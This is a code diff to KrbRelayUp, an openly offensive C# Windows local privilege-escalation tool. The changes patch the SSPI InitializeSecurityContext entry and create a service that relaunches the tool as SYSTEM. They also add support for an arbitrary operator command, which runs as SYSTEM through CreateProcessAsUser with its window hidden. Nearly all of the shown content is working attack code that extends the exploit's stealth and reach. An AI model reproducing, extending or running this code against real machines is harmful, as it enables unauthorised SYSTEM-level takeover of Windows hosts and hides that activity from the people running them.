@@ -44,12 +44,13 @@ namespace KrbRelayUp
             int oInitializeSecurityContext = Marshal.OffsetOf(typeof(SecurityFunctionTable), "InitializeSecurityContext").ToInt32();
             Marshal.Copy(bInitializeSecurityContext, 0, functionTable + oInitializeSecurityContext, bInitializeSecurityContext.Length);
 
-            if (String.IsNullOrEmpty(Options.serviceCommand))
+            string exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            int session_id = System.Diagnostics.Process.GetCurrentProcess().SessionId;
+            if(String.IsNullOrEmpty(Options.serviceCommand))
             {
-                string exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
-                int session_id = System.Diagnostics.Process.GetCurrentProcess().SessionId;
-                Options.serviceCommand = $"\"{exe}\" system {session_id}\n";
+                Options.serviceCommand = "cmd.exe";
             }
+            string spawnKrbrelaySystemCommand = $"\"{exe}\" system {session_id} \"" + Options.serviceCommand + "\"";
 
             IntPtr hScm = OpenSCManager("127.0.0.1", null, ScmAccessRights.Connect | ScmAccessRights.CreateService);
 
@@ -59,7 +60,9 @@ namespace KrbRelayUp
                 return;
             }
 
-            IntPtr hService = CreateService(hScm, Options.serviceName, null, ServiceAccessRights.AllAccess, 0x10, ServiceBootFlag.DemandStart, ServiceError.Ignore, Options.serviceCommand, null, IntPtr.Zero, null, null, null);
+            Console.WriteLine($"[+] Service Name: {Options.serviceName}");
+
+            IntPtr hService = CreateService(hScm, Options.serviceName, null, ServiceAccessRights.AllAccess, 0x10, ServiceBootFlag.DemandStart, ServiceError.Ignore, spawnKrbrelaySystemCommand, null, IntPtr.Zero, null, null, null);
 
             if (hService == IntPtr.Zero)
             {
@@ -91,7 +94,7 @@ namespace KrbRelayUp
             Console.WriteLine("[+] Clean-up done");
         }
 
-        public static void RunSystemProcess(int session_id)
+        public static void RunSystemProcess(int session_id, string cmdline)
         {
             IntPtr hToken = IntPtr.Zero;
             if (!OpenProcessToken((IntPtr)(-1), 0x0002, out hToken))
@@ -113,14 +116,15 @@ namespace KrbRelayUp
                 Console.WriteLine($"[-] Error setting session ID: {Marshal.GetLastWin32Error()}");
                 return;
             }
+
             STARTUPINFO start_info = new STARTUPINFO();
             start_info.cb = Marshal.SizeOf(start_info);
             start_info.lpDesktop = "WinSta0\\Default";
-            start_info.wShowWindow = 5;
+            start_info.wShowWindow = 0;
+            // string cmdline = "powershell.exe";
 
-            string cmdline = "cmd.exe";
             PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
-            if (!CreateProcessAsUser(hPrimaryToken, null, cmdline, ref s, ref s, false, 0x00000010, IntPtr.Zero, null, ref start_info, out proc_info))
+            if (!CreateProcessAsUser(hPrimaryToken, null, cmdline, ref s, ref s, false, 0x08000000, IntPtr.Zero, null, ref start_info, out proc_info))
             {
                 Console.WriteLine($"[-] Error creating process: {Marshal.GetLastWin32Error()}");
                 return;
